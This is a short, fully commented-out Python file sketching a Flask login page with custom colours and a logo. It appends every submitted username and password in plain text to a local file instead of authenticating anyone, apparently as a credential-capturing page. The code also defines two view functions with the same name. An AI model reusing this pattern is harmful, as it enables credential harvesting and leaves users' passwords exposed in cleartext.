# from flask import Flask, render_template, request

# app = Flask(__name__)
#This is just an optional Flask webservice if you want to run the login page



# # Define the custom colors and logo
# custom_colors = {'background': '#f0f0f0', 'text': '#333333', 'button': '#428bca'}
# custom_logo = 'https://example.com/images/logo.png'

# # Define the login route
# @app.route('/login')
# def login():
#     return render_template('login.html', colors=custom_colors, logo=custom_logo)

# @app.route('/login', methods=['POST'])
# def login():
#     username = request.form['username']
#     password = request.form['password']
#     # do something with the form data, e.g. authenticate the user
#     with open('login_data.txt', 'a') as f:
#         f.write(f'username: {username}, password: {password}\n')
#     return 'Welcome, ' + username

# # Run the Flask application
# if __name__ == '__main__':
#     app.run()
